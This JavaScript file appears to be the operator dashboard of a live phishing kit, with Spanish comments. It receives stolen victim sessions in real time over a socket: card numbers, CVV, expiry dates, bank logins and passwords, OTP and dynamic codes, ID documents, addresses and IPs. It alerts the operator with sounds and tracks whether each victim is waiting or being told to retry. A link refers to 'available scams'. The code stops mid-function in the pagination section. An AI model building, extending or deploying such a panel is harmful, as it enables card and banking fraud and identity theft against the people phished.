// =========================
// Config / State
// =========================
const nodeUrl = window.ADMIN_CFG?.nodeUrl || "http://localhost:3005";
let socket;
let sessionsById = {};
let selectedId = null;
let bootstrapped = false;

// Projects map (loaded from PHP)
const projectsMap = window.PROJECTS_MAP || {};

// Pagination state
let sessionsPerPage = parseInt(localStorage.getItem('sessionsPerPage')) || 15;
let currentPage = 1;
let totalPages = 1;

// =========================
// Desbloqueo de sonido
// =========================

const sounds = {
    newData: new Audio("/assets/sounds/newdata1.mp3"),
    error: new Audio("/assets/sounds/error1.mp3"),
    wait: new Audio("/assets/sounds/wait1.mp3"),
    next: new Audio("/assets/sounds/next1.mp3"),
};

sounds.newData.volume = 1;
sounds.error.volume = 1;
sounds.wait.volume = 1;
sounds.wait.next = 1;

// =========================
// Desbloqueo de sonido
// =========================

let soundEnabled = true;
let audioUnlocked = false;

async function unlockAudio() {
    if (audioUnlocked) return;

    try {
        // calienta TODOS los audios para iOS/Android
        for (const a of Object.values(sounds)) {
            a.muted = true;
            await a.play();
            a.pause();
            a.currentTime = 0;
            a.muted = false;
        }

        audioUnlocked = true;

        console.log("🔊 Audio desbloqueado (mobile ok)");
    } catch (e) {
        // si falla, no hacemos nada; el usuario puede volver a tocar
    }
}

document.addEventListener("pointerdown", unlockAudio, { once: true });
/* document.addEventListener("click", unlockAudio, { once: true });
document.addEventListener("touchstart", unlockAudio, { once: true }); */

// =========================
// Función segura para reproducir sonido
// =========================

function playSound(kind) {
    if (!soundEnabled) return;

    // Solo reproducir si la página está visible (no encolar sonidos)
    if (document.visibilityState !== "visible") return;

    // No reproducir si el audio no está desbloqueado
    if (!audioUnlocked) return;

    const a = sounds[kind];
    if (!a) return;

    a.currentTime = 0;
    a.play().catch(() => {});
}

// =========================
// Skeleton Loading
// =========================
function hideSkeleton() {
    const skeleton = document.getElementById("sessionsSkeleton");
    const list = document.getElementById("sessionsList");
    if (skeleton) skeleton.classList.remove("loading");
    if (list) list.classList.remove("loading");
}

function showSkeleton() {
    const skeleton = document.getElementById("sessionsSkeleton");
    const list = document.getElementById("sessionsList");
    if (skeleton) skeleton.classList.add("loading");
    if (list) list.classList.add("loading");
}

// =========================
// UI helpers
// =========================
const ACTION_UI = {
    DATA: {
        label: "DATA",
        css: "background:transparent;color:rgb(255 255 255 / 28%);",
    },
    DATA_ERROR: {
        label: "DATA",
        css: "background:var(--red);color:rgba(255, 255, 255, 0.82);",
    },
    DATA_WAIT_ACTION: {
        label: "DATA",
        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
    },
    CC: {
        label: "CC",
        css: "background:transparent;color:rgb(255 255 255 / 28%);",
    },
    CC_ERROR: {
        label: "CC",
        css: "background:var(--red);color:rgba(255, 255, 255, 0.82);",
    },
    CC_WAIT_ACTION: {
        label: "CC",
        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
    },

    AUTH: {
        label: "LOGO",
        css: "background:transparent;color:rgb(255 255 255 / 28%);",
    },
    AUTH_ERROR: {
        label: "LOGO",
        css: "background:var(--red);color: rgba(255, 255, 255, 0.82);",
    },
    AUTH_WAIT_ACTION: {
        label: "LOGO",
        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);",
    },

    DINAMIC: {
        label: "DINA",
        css: "background:transparent;color:rgb(255 255 255 / 28%);",
    },
    DINAMIC_ERROR: {
        label: "DINA",
        css: "background:var(--red);color: rgba(255, 255, 255, 0.82);",
    },
    DINAMIC_WAIT_ACTION: {
        label: "DINA",
        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
    },

    OTP: {
        label: "OTP",
        css: "background:transparent;color:rgb(255 255 255 / 28%);",
    },
    OTP_ERROR: {
        label: "OTP",
        css: "background:var(--red);color: rgba(255, 255, 255, 0.82);",
    },
    OTP_WAIT_ACTION: {
        label: "OTP",
        css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
    },

    FINISH: { label: "OK", css: "background:var(--green);color:#fff;" },
};

function applyActionUI(el, action) {
    if (!el) return;
    el.textContent = action ?? "—";
    el.style.cssText = "";

    const ui = ACTION_UI[action];
    if (ui) {
        el.textContent = ui.label;
        el.style.cssText = ui.css;
    }
}

function escapeHtml(value) {
    return String(value ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
}

// =========================
// Modal helpers
// =========================
const modalOverlay = document.getElementById("modalOverlay");
const closeModalBtn = document.getElementById("closeModalBtn");

function isSmallScreen() {
    return window.matchMedia("(max-width: 980px)").matches;
}

function openModal() {
    modalOverlay?.classList.add("open");
    modalOverlay?.setAttribute("aria-hidden", "false");
    document.body.style.overflow = "hidden";
}

function closeModal() {
    modalOverlay?.classList.remove("open");
    modalOverlay?.setAttribute("aria-hidden", "true");
    document.body.style.overflow = "";
    resetModalSections();
}

function hasValue(v) {
    return v !== null && v !== undefined && String(v).trim() !== "";
}

closeModalBtn?.addEventListener("click", closeModal);
modalOverlay?.addEventListener("click", (e) => {
    if (e.target === modalOverlay) closeModal();
});
window.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && modalOverlay?.classList.contains("open"))
        closeModal();
});

window.addEventListener("resize", () => {
    if (!isSmallScreen() && modalOverlay?.classList.contains("open"))
        closeModal();
});

// =========================
// State dot
// =========================
function stateDotClass(state) {
    switch (String(state || "").toUpperCase()) {
        case "ACTIVE":
            return "green";
        case "INACTIVE":
            return "red";
        case "MINIMIZED":
            return "yellow";
        default:
            return "gray";
    }
}

function stateDot(state) {
    return `<span class="dot ${stateDotClass(state)}"></span>`;
}

// =========================
// Action dot
// =========================
function sectionDotClass(s, key) {
    const action = String(s?.action || "").toUpperCase();

    const SECTIONS = {
        DATA: {
            actions: ["DATA", "DATA_WAIT_ACTION", "DATA_ERROR"],
            required: ["name", "document", "address", "phone", "email"],
        },
        CC: {
            actions: ["CC", "CC_WAIT_ACTION", "CC_ERROR"],
            required: ["cc", "exp", "cvv", "holder"],
        },
        LOGO: {
            actions: ["AUTH", "AUTH_WAIT_ACTION", "AUTH_ERROR"],
            required: ["user", "pass"],
        },
        DINA: {
            actions: ["DINAMIC", "DINAMIC_WAIT_ACTION", "DINAMIC_ERROR"],
            required: ["dinamic"],
        },
        OTP: {
            actions: ["OTP", "OTP_WAIT_ACTION", "OTP_ERROR"],
            required: ["otp"],
        },
    };

    const hasValue = (v) =>
        v !== null && v !== undefined && String(v).trim() !== "";

    const sec = SECTIONS[key];
    if (!sec) return "no-section";

    const isActive = sec.actions.includes(action);

    const hasAny = sec.required.some((k) => hasValue(s?.[k]));
    const isComplete = sec.required.every((k) => hasValue(s?.[k]));

    // Si no hay nada de esa sección y no está activa -> no-section
    if (!hasAny && !isActive) return "no-section";

    // Si está activa y es ERROR -> section-error
    if (isActive && action.endsWith("_ERROR")) return "section-error";

    // Si está activa y le faltan datos -> missing
    if (isActive && action.endsWith("_WAIT_ACTION")) return "section-missing";

    // Si ya está completa (aunque no esté activa) -> complete
    if (isComplete && !isActive) return "section-complete";

    // Si hay algo pero incompleto (y no está activa) -> missing (para que se vea que existe)
    return "section-missing";
}

/* function actionDetailDot(action, label) {
    return `<span class="action-detail-dot ${actionDotClass(action)}">}</span>`;
} */

function actionDot(action) {
    return `<span class="action-dot" style="color:rgba(255, 255, 255, 0.82);;${ACTION_UI[action]?.css ?? action ?? "gray"}">${ACTION_UI[action]?.label ?? action ?? "—"}</span>`;
}

// =========================
// Dynamic sections
// =========================
const topEl = document.getElementById("modalFocus");
const historyEl = document.getElementById("modalHistory");

// sessionId -> last base step (AUTH/DINAMIC/OTP/CC)
const lastStepBySession = new Map();
// sessionId -> { currentStep: "AUTH", historySteps: ["CC","AUTH",...], htmlByStep: Map(step -> html) }
const timelineBySession = new Map();
// sessionId -> sectionType (locked the first time we see/choose it)
const sectionTypeBySession = new Map(); // "CC" | "AUTH" | "DINAMIC" | "OTP" | "OTHER"
// sessionId -> wrapper node (single node per session, moved between top/history)
const nodeBySession = new Map();
// what is currently in TOP
let topSessionId = null;

const STEPS = [
    {
        key: "CC",
        exists: (s) => hasValue(s.cc) || hasValue(s.cvv) || hasValue(s.exp),
        render: (s) => sectionCc(s),
    },
    {
        key: "AUTH",
        exists: (s) => hasValue(s.user) || hasValue(s.pass),
        render: (s) => sectionLogo(s),
    },
    {
        key: "DINAMIC",
        exists: (s) => hasValue(s.dinamic),
        render: (s) => sectionDina(s),
    },
    {
        key: "OTP",
        exists: (s) => hasValue(s.otp),
        render: (s) => sectionOtp(s),
    },
    // Opcional: si quieres mostrar “Other” cuando haya datos personales
    {
        key: "OTHER",
        exists: (s) =>
            hasValue(s.name) ||
            hasValue(s.lastname) ||
            hasValue(s.email) ||
            hasValue(s.ip),
        render: (s) => sectionOther(s),
    },
];

function baseStepFromAction(action) {
    const a = String(action || "").toUpperCase();
    if (a.startsWith("CC")) return "CC";
    if (a.startsWith("AUTH")) return "AUTH";
    if (a.startsWith("DINAMIC")) return "DINAMIC";
    if (a.startsWith("OTP")) return "OTP";
    return "OTHER";
}

function baseTypeFromAction(action) {
    const a = String(action || "").toUpperCase();
    if (a.startsWith("CC")) return "CC";
    if (a.startsWith("AUTH")) return "AUTH";
    if (a.startsWith("DINAMIC")) return "DINAMIC";
    if (a.startsWith("OTP")) return "OTP";
    return "OTHER";
}

function getLockedSectionType(session) {
    const id = session?.id;
    if (!id) return "OTHER";
    if (sectionTypeBySession.has(id)) return sectionTypeBySession.get(id);

    // lock the type on first decision
    const t = baseTypeFromAction(session.action);
    sectionTypeBySession.set(id, t);
    return t;
}

function getCcStatus(s) {
    const action = String(s.action || "").toUpperCase();
    const hasCc = !!s.cc && !!s.exp && !!s.cvv;

    if (!hasCc || ["CC", "CC_WAIT_ACTION"].includes(action))
        return { icon: "⏳", state: "waiting", label: "Esperando" };
    if ((hasCc && action.includes("CC_ERROR")) || (!hasCc && !action.includes("CC")))
        return { icon: "✕", state: "error", label: "Error" };
    if (hasCc && !action.includes("CC"))
        return { icon: "✓", state: "success", label: "Completado" };
    return { icon: "—", state: "idle", label: "" };
}

function sectionCc(s) {
    const status = getCcStatus(s);
    return `
    <div class="section-content">
      <div class="section-header">CC</div>
      <div class="section-data">
        <div class="data-row">
          <span class="data-label">Nombre:</span>
          <span class="data-value">${escapeHtml(s.holder ?? "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">Tarjeta:</span>
          <span class="data-value">${escapeHtml(s.cc ?? "—")}</span>
        </div>
        <div class="data-row-inline">
          <div class="data-row">
            <span class="data-label">CVV:</span>
            <span class="data-value">${escapeHtml(s.cvv ?? "—")}</span>
          </div>
          <div class="data-row">
            <span class="data-label">Exp:</span>
            <span class="data-value">${escapeHtml(s.exp ?? "—")}</span>
          </div>
        </div>
      </div>
    </div>
    <div class="section-status ${status.state}">
      <span class="status-icon">${status.icon}</span>
      <span class="status-label">${status.label}</span>
    </div>
  `;
}

function getLogoStatus(s) {
    const action = String(s.action || "").toUpperCase();
    const hasLogo = !!s.user && !!s.pass;

    if (!hasLogo || ["AUTH", "AUTH_WAIT_ACTION"].includes(action))
        return { icon: "⏳", state: "waiting", label: "Esperando" };
    if ((hasLogo && action.includes("AUTH_ERROR")) || (!hasLogo && !action.includes("AUTH")))
        return { icon: "✕", state: "error", label: "Error" };
    if (hasLogo && !action.includes("AUTH"))
        return { icon: "✓", state: "success", label: "Completado" };
    return { icon: "—", state: "idle", label: "" };
}

function sectionLogo(s) {
    const status = getLogoStatus(s);
    return `
    <div class="section-content">
      <div class="section-header">LOGO</div>
      <div class="section-data">
        <div class="data-row">
          <span class="data-label">Usuario:</span>
          <span class="data-value">${escapeHtml(s.user ?? "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">Contraseña:</span>
          <span class="data-value">${escapeHtml(s.pass ?? "—")}</span>
        </div>
      </div>
    </div>
    <div class="section-status ${status.state}">
      <span class="status-icon">${status.icon}</span>
      <span class="status-label">${status.label}</span>
    </div>
  `;
}

function getDinaStatus(s) {
    const action = String(s.action || "").toUpperCase();
    const hasDina = !!s.dinamic;

    if (!hasDina || ["DINAMIC", "DINAMIC_WAIT_ACTION"].includes(action))
        return { icon: "⏳", state: "waiting", label: "Esperando" };
    if ((hasDina && action.includes("DINAMIC_ERROR")) || (!hasDina && !action.includes("DINAMIC")))
        return { icon: "✕", state: "error", label: "Error" };
    if (hasDina && !action.includes("DINAMIC"))
        return { icon: "✓", state: "success", label: "Completado" };
    return { icon: "—", state: "idle", label: "" };
}

function sectionDina(s) {
    const status = getDinaStatus(s);
    return `
    <div class="section-content">
      <div class="section-header">DINA</div>
      <div class="section-data">
        <div class="data-row">
          <span class="data-label">Valor:</span>
          <span class="data-value">${escapeHtml(s.dinamic ?? "—")}</span>
        </div>
      </div>
    </div>
    <div class="section-status ${status.state}">
      <span class="status-icon">${status.icon}</span>
      <span class="status-label">${status.label}</span>
    </div>
  `;
}

function getOtpStatus(s) {
    const action = String(s.action || "").toUpperCase();
    const hasOtp = !!s.otp;

    if (!hasOtp || ["OTP", "OTP_WAIT_ACTION"].includes(action))
        return { icon: "⏳", state: "waiting", label: "Esperando" };
    if ((hasOtp && action.includes("OTP_ERROR")) || (!hasOtp && !action.includes("OTP")))
        return { icon: "✕", state: "error", label: "Error" };
    if (hasOtp && !action.includes("OTP"))
        return { icon: "✓", state: "success", label: "Completado" };
    return { icon: "—", state: "idle", label: "" };
}

function sectionOtp(s) {
    const status = getOtpStatus(s);
    return `
    <div class="section-content">
      <div class="section-header">OTP</div>
      <div class="section-data">
        <div class="data-row">
          <span class="data-label">Código:</span>
          <span class="data-value">${escapeHtml(s.otp ?? "—")}</span>
        </div>
      </div>
    </div>
    <div class="section-status ${status.state}">
      <span class="status-icon">${status.icon}</span>
      <span class="status-label">${status.label}</span>
    </div>
  `;
}

function getDataStatus(s) {
    const action = String(s.action || "").toUpperCase();
    const hasData = !!s.name && !!s.document && !!s.address && !!s.email;

    if (!hasData && ["DATA", "DATA_WAIT_ACTION"].includes(action))
        return { icon: "⏳", state: "waiting", label: "Esperando" };
    if (hasData && action.includes("DATA_ERROR"))
        return { icon: "✕", state: "error", label: "Error" };
    if (hasData && !action.includes("DATA"))
        return { icon: "✓", state: "success", label: "Completado" };
    return { icon: "—", state: "idle", label: "Sin datos" };
}

function sectionOther(s) {
    const status = getDataStatus(s);
    return `
    <div class="section-content">
      <div class="section-header">Información Personal</div>
      <div class="section-data">
        <div class="data-row">
          <span class="data-label">Nombre:</span>
          <span class="data-value">${escapeHtml(s.name ?? "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">Documento:</span>
          <span class="data-value">${escapeHtml(s.document ?? "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">Dirección:</span>
          <span class="data-value">${escapeHtml(s.address ?? "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">Teléfono:</span>
          <span class="data-value">${escapeHtml(s.phone ?? "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">País:</span>
          <span class="data-value">${escapeHtml(s.country ?? "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">Ciudad:</span>
          <span class="data-value">${escapeHtml(s.city ?? "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">Email:</span>
          <span class="data-value">${escapeHtml(s.email ?? "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">IP:</span>
          <span class="data-value">${escapeHtml(s.ip ?? "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">Browser:</span>
          <span class="data-value">${escapeHtml(s.wb ?? "—")}</span>
        </div>
      </div>
    </div>
    <div class="section-status ${status.state}">
      <span class="status-icon">${status.icon}</span>
      <span class="status-label">${status.label}</span>
    </div>
  `;
}

function renderModalSectionsForSession(s) {
    if (!s?.id || !topEl || !historyEl) return;

    // 1) Lista de secciones disponibles (ya tienen data)
    const available = STEPS.filter((step) => step.exists(s));

    // 2) Decide cuál va arriba (focus)
    const focusKey = baseStepFromAction(s.action);
    const focusStep =
        available.find((x) => x.key === focusKey) ||
        available[0] || // si la acción aún no tiene data, muestra la primera disponible
        STEPS.find((x) => x.key === focusKey) || // fallback
        STEPS[0];

    // 3) Render Focus
    topEl.innerHTML = "";
    const focusNode = document.createElement("div");
    focusNode.className = "modalHistory"; // ✅ requerido
    focusNode.dataset.step = focusStep.key;
    focusNode.innerHTML = focusStep.render(s);
    topEl.appendChild(focusNode);

    // 4) Render History (todas las demás disponibles)
    historyEl.innerHTML = "";
    for (const step of available) {
        if (step.key === focusStep.key) continue;
        const node = document.createElement("div");
        node.className = "modalHistory"; // ✅ requerido
        node.dataset.step = step.key;
        node.innerHTML = step.render(s);
        historyEl.appendChild(node);
    }
}

function renderSectionForStep(step, s) {
    switch (step) {
        case "CC":
            return sectionCc(s);
        case "AUTH":
            return sectionLogo(s);
        case "DINAMIC":
            return sectionDina(s);
        case "OTP":
            return sectionOtp(s);
        default:
            return sectionOther(s);
    }
}

/**
 * Pone una sesión en TOP y mantiene 1 solo nodo por sesión.
 * - Si cambias de sesión: el TOP anterior pasa a history (una sola vez).
 * - Si vuelves a seleccionar una sesión que ya estaba en history: se mueve a TOP (no se duplica).
 * - La sesión SIEMPRE mantiene el mismo tipo de sección (locked).
 */
function renderModalForSession(sessionId) {
    const t = timelineBySession.get(sessionId);
    if (!t || !topEl || !historyEl) return;

    // Focus (actual)
    topEl.innerHTML = "";
    const focusNode = document.createElement("div");
    focusNode.className = "modalHistory"; // ✅ requerido
    focusNode.dataset.step = t.currentStep;
    focusNode.innerHTML = t.htmlByStep.get(t.currentStep) || "";
    topEl.appendChild(focusNode);

    // History (anteriores)
    historyEl.innerHTML = "";
    for (let i = t.historySteps.length - 1; i >= 0; i--) {
        const step = t.historySteps[i];
        const node = document.createElement("div");
        node.className = "modalHistory"; // ✅ requerido
        node.dataset.step = step;
        node.innerHTML = t.htmlByStep.get(step) || "";
        historyEl.appendChild(node);
    }
}

function resetModalSections() {
    // Limpia DOM
    if (topEl) topEl.innerHTML = "";
    if (historyEl) historyEl.innerHTML = "";
}

function updateTimelineWithSession(s) {
    if (!s?.id) return;

    const id = s.id;
    const step = baseStepFromAction(s.action);

    // Inicializa timeline si no existe
    if (!timelineBySession.has(id)) {
        timelineBySession.set(id, {
            currentStep: step,
            historySteps: [],
            htmlByStep: new Map(),
        });
    }

    const t = timelineBySession.get(id);

    // siempre actualiza el html del step actual (pueden llegar nuevos datos)
    t.htmlByStep.set(step, renderSectionForStep(step, s));

    const lastStep = lastStepBySession.get(id);

    // Si cambió de step (AUTH -> DINAMIC -> OTP...), empuja el anterior al history (sin duplicar)
    if (lastStep && lastStep !== step) {
        // guarda el HTML del step anterior si aún no está (o actualízalo)
        // (útil si el último update era del step anterior)
        if (!t.htmlByStep.has(lastStep)) {
            t.htmlByStep.set(lastStep, renderSectionForStep(lastStep, s));
        }

        // evita duplicados en history
        if (!t.historySteps.includes(lastStep)) {
            t.historySteps.push(lastStep);
        }
    }

    // actualiza el current
    t.currentStep = step;
    lastStepBySession.set(id, step);
}

// =========================
// Socket connect
// =========================
export async function connectAdmin() {
    const r = await fetch("/admin/socket-token", {
        credentials: "same-origin",
    });
    const data = await r.json();

    if (!r.ok) {
        console.error("Error obteniendo token:", data);
        // Si es error de autenticación, redirigir
        if (r.status === 401 || r.status === 419) {
            if (window.handleSessionError) {
                window.handleSessionError(r.status);
            }
        } else if (window.Toast) {
            Toast.error("No se pudo conectar al servidor.", "Error de Conexión");
        }
        return;
    }

    socket = io(nodeUrl, {
        transports: ["websocket"],
        auth: { token: data.token },
    });

    socket.on("connect_error", (err) => {
        const pill = document.getElementById("connPill");
        if (pill) pill.innerHTML = "Socket:" + stateDot("INACTIVE");
        console.error("❌ connect_error:", err.message);

        // Verificar si es error de autenticación/token
        const isAuthError = err.message.toLowerCase().includes("token") ||
                           err.message.toLowerCase().includes("auth") ||
                           err.message.toLowerCase().includes("expired") ||
                           err.message.toLowerCase().includes("unauthorized");

        if (isAuthError && window.handleSessionError) {
            window.handleSessionError(401);
        } else if (window.Toast) {
            Toast.error("Error de conexión: " + err.message, "Socket Error");
        } else {
            alert("Socket error: " + err.message);
        }
    });

    socket.on("admin:sessions:bootstrap", (sessions) => {
        sessionsById = {};
        (sessions || []).forEach((sess) => (sessionsById[sess.id] = sess));

        // Hide skeleton, show content
        hideSkeleton();

        renderList();

        // Delay para ignorar upserts que llegan justo después del bootstrap
        // (evita que suene newData para registros existentes que se sincronizan)
        setTimeout(() => {
            bootstrapped = true;
        }, 2000);
        // refresca el detalle si había selección
        if (selectedId && sessionsById[selectedId]) {
            renderDetail(sessionsById[selectedId]);
        }
    });

    socket.on("admin:sessions:upsert", (sess) => {
        console.log(sess);
        const prev = sessionsById[sess.id]; // sesión anterior (o undefined)
        const isNew = !prev; // ✅ nueva si antes no existía
        const prevAction = prev?.action;

        sessionsById[sess.id] = sess;
        renderList();

        // 🔊 NUEVO REGISTRO
        if (isNew && bootstrapped) {
            playSound("newData");
        }

        // 🔊 si pasó a WAIT
        const nowWait = String(sess.action || "").endsWith("_WAIT_ACTION");
        const wasWait = String(prevAction || "").endsWith("_WAIT_ACTION");
        if (nowWait && !wasWait) {
            playSound("wait");
        }

        // 🔊 ERROR: NO se reproduce aquí automáticamente
        // Solo suena cuando el admin pulsa el botón de error (en window.act)

        // Actualiza timeline SIEMPRE (aunque no esté seleccionada)
        updateTimelineWithSession(sess);

        // Si es la que estoy viendo, refresca detalle y modal
        if (selectedId === sess.id) {
            renderDetail(sess);

            if (isSmallScreen() && modalOverlay?.classList.contains("open")) {
                renderModalSectionsForSession(sess); // ✅ se actualiza cuando cambie action o llegue data nueva
                renderActionsHTML(sess, "modalActions");
            }
        }
    });

    socket.on("error:msg", (msg) => {
        if (window.Toast) {
            Toast.error(msg, "Error");
        } else {
            alert(msg);
        }
    });

    // ========================================
    // Panel User Presence Events
    // ========================================
    socket.on("panel-user:online", (user) => {
        console.log("[WS] User online:", user);
        updateUserOnlineStatus(user.odId, true, user);
    });

    socket.on("panel-user:offline", (data) => {
        console.log("[WS] User offline:", data.odId);
        updateUserOnlineStatus(data.odId, false);
    });

    // ========================================
    // Project Membership Events
    // ========================================
    socket.on("project:membership-update", (update) => {
        console.log("[WS] Project membership update:", update);
        showMembershipNotification(update);
    });
}

// ========================================
// User Presence UI Functions
// ========================================
function updateUserOnlineStatus(userId, isOnline, userData = null) {
    // Find user row in the users table
    const userRow = document.querySelector(`tr[data-user-id="${userId}"]`);
    if (!userRow) return;

    const statusEl = userRow.querySelector("[data-online-indicator]");
    if (!statusEl) return;

    if (isOnline) {
        statusEl.classList.remove("offline");
        statusEl.classList.add("online");
        statusEl.querySelector(".online-text").textContent = "Online";
    } else {
        statusEl.classList.remove("online");
        statusEl.classList.add("offline");
        statusEl.querySelector(".online-text").textContent = "Offline";
    }
}

// ========================================
// Membership Notification Functions
// ========================================
function showMembershipNotification(update) {
    const { projectId, projectName, status } = update;

    let message = "";
    let type = "info";

    switch (status) {
        case "APPROVED":
            message = `Tu solicitud para el proyecto "${projectName}" ha sido aprobada.`;
            type = "success";
            break;
        case "REJECTED":
            message = `Tu solicitud para el proyecto "${projectName}" ha sido rechazada.`;
            type = "error";
            break;
        case "REMOVED":
            message = `Has sido removido del proyecto "${projectName}".`;
            type = "warning";
            break;
    }

    showToast(message, type);

    // If approved, we might want to refresh the page or update UI
    if (status === "APPROVED") {
        // Optional: Reload the page after a delay to get new project access
        setTimeout(() => {
            if (confirm("Has sido aprobado para un nuevo proyecto. ¿Deseas recargar la pagina para ver las sesiones?")) {
                window.location.reload();
            }
        }, 2000);
    }
}

// ========================================
// Toast Notification Helper
// ========================================
function showToast(message, type = "info") {
    // Check if there's a toast container
    const container = document.getElementById("toast-container") || createToastContainer();

    const toast = document.createElement("div");
    toast.className = `toast toast-${type}`;

    const icons = {
        success: "fas fa-check-circle",
        error: "fas fa-times-circle",
        warning: "fas fa-exclamation-triangle",
        info: "fas fa-info-circle",
    };

    const titles = {
        success: "Verificado",
        error: "Error",
        warning: "Aviso",
        info: "Info",
    };

    toast.innerHTML = `
        <i class="toast-icon ${icons[type] || icons.info}"></i>
        <div class="toast-content">
            <div class="toast-title">${titles[type] || titles.info}</div>
            <div class="toast-message">${message}</div>
        </div>
        <button class="toast-close" onclick="this.parentElement.remove()">
            <i class="fas fa-times"></i>
        </button>
    `;

    container.appendChild(toast);

    // Auto-remove after 5 seconds
    setTimeout(() => {
        toast.classList.add("toast-exit");
        setTimeout(() => toast.remove(), 300);
    }, 5000);
}

function createToastContainer() {
    const container = document.createElement("div");
    container.id = "toast-container";
    container.className = "toast-container";
    document.body.appendChild(container);
    return container;
}

// =========================
// List render
// =========================
function getProjectName(projectId) {
    if (!projectId) return "Sin proyecto";
    return projectsMap[projectId] || projectId;
}

function renderList() {
    const listEl = document.getElementById("sessionsList");
    if (!listEl) return;

    const allItems = Object.values(sessionsById).sort(
        (a, b) => new Date(b.updatedAt) - new Date(a.updatedAt),
    );

    // Pagination calculations
    const totalItems = allItems.length;
    totalPages = Math.ceil(totalItems / sessionsPerPage);

    // Ensure current page is valid
    if (currentPage > totalPages) currentPage = totalPages;
    if (currentPage < 1) currentPage = 1;

    // Get items for current page
    const startIndex = (currentPage - 1) * sessionsPerPage;
    const endIndex = startIndex + sessionsPerPage;
    const items = allItems.slice(startIndex, endIndex);

    // Render pagination
    renderPagination(totalItems);

    // Show empty state if no items
    if (totalItems === 0) {
        listEl.innerHTML = `
            <div class="alert alert-info mb-0">
                <i class="fas fa-info-circle"></i> No hay registros disponibles.
                <a href="/projects/available">Ver scams disponibles</a>.
            </div>
        `;
        return;
    }

    listEl.innerHTML = items
        .map((s) => {
            const selected = selectedId === s.id ? "activeSel" : "";

            const hasCc = !!(s.cc && s.exp && s.cvv);
            const hasLogo = !!(s.user && s.pass);
            const hasDina = !!s.dinamic;
            const hasData = !!(
                s.name &&
                s.document &&
                s.address &&
                s.phone &&
                s.email
            );
            const hasOtp = !!s.otp;

            const bankLabel = !s.bank || s.bank === "null"
                ? "⏳🏦"
                : `${s.bank.charAt(0).toUpperCase() + s.bank.slice(1)}`;

            const typeLabel = !s.cc || s.cc === "null" && !s.level || s.level === "null"
                ? "⏳💳"
                : `${s.type || ""} - ${s.level || ""}`;
            const actionLabel = actionDot(s.action);
            const dot = stateDot(s.state);

            const dataCls = sectionDotClass(s, "DATA");
            const ccCls = sectionDotClass(s, "CC");
            const logoCls = sectionDotClass(s, "LOGO");
            const otpCls = sectionDotClass(s, "OTP");
            const dinaCls = sectionDotClass(s, "DINA");

            // Get project name from map
            const projectName = getProjectName(s.projectId);

            return `
                <div class="row ${selected}" onclick="openSession('${escapeHtml(s.id)}')">
                <div class="rowMain">
                    <div class="rowTop">
                    <div class="rowtop-left">
                        <div class="rowtop-left-id">
                        ${dot}
                        <span class="sid">${escapeHtml(s.id)}</span>
                        </div>
                        <div class="rowtop-left-name">
                        <span class="project-slug">${escapeHtml(projectName)}</span>
                        <br>
                        <span class="sname">${escapeHtml(s.name ?? "Sin nombre")}</span>
                        </div>
                    </div>
                    <div class="rowtop-rigth">
                        ${actionLabel}
                    </div>
                    </div>

                    <div class="meta">
                    <div class="bank">
                        <span class="kv"><b>${escapeHtml(bankLabel)}</b></span>
                        <span class="kv"><b>${escapeHtml(typeLabel)}</b></span>
                    </div>

                    <div class="action-details">
                        <span class="kv-action ${dataCls}"><b>DATA</b></span>
                        <span class="kv-action ${ccCls}"><b>CC</b></span>
                        <span class="kv-action ${logoCls}"><b>LOGO</b></span>
                        <span class="kv-action ${otpCls}"><b>OTP</b></span>
                        <span class="kv-action ${dinaCls}"><b>DINA</b></span>
                    </div>
                    </div>
                </div>
                </div>
            `;
        })
        .join("");
}

// =========================
// Pagination render
// =========================
function renderPagination(totalItems) {
    const paginationEl = document.getElementById("sessionsPagination");
    const infoEl = document.getElementById("paginationInfo");
    const pagesEl = document.getElementById("paginationPages");
    const prevBtn = document.getElementById("prevPage");
    const nextBtn = document.getElementById("nextPage");
    const firstBtn = document.getElementById("firstPage");
    const lastBtn = document.getElementById("lastPage");
    const perPageSelect = document.getElementById("sessionsPerPage");

    if (!paginationEl) return;

    // Show/hide pagination
    if (totalItems === 0) {
        paginationEl.style.display = "none";
        return;
    }

    paginationEl.style.display = "";

    // Update per page select
    if (perPageSelect) {
        perPageSelect.value = sessionsPerPage;
    }

    // Calculate range
    const startItem = totalItems === 0 ? 0 : (currentPage - 1) * sessionsPerPage + 1;
    const endItem = Math.min(currentPage * sessionsPerPage, totalItems);

    // Update info
    if (infoEl) {
        infoEl.textContent = `Mostrando ${startItem} - ${endItem} de ${totalItems} sesiones`;
    }

    // Update buttons state
    if (firstBtn) {
        firstBtn.disabled = currentPage === 1;
        firstBtn.classList.toggle("disabled", currentPage === 1);
    }
    if (prevBtn) {
        prevBtn.disabled = currentPage === 1;
        prevBtn.classList.toggle("disabled", currentPage === 1);
    }
    if (nextBtn) {
        nextBtn.disabled = currentPage >= totalPages;
        nextBtn.classList.toggle("disabled", currentPage >= totalPages);
    }
    if (lastBtn) {
        lastBtn.disabled = currentPage >= totalPages;
        lastBtn.classList.toggle("disabled", currentPage >= totalPages);
    }

    // Render page numbers
    if (pagesEl) {
        let pagesHtml = "";

        for (let i = 1; i <= totalPages; i++) {
            // Show first, last, and pages within 2 of current
            if (i === 1 || i === totalPages || Math.abs(i - currentPage) <= 2) {
                if (i === currentPage) {
                    pagesHtml += `<span class="pagination-page active" aria-current="page">${i}</span>`;
                } else {
                    pagesHtml += `<a href="#" class="pagination-page" data-page="${i}">${i}</a>`;
                }
            } else if (Math.abs(i - currentPage) === 3) {
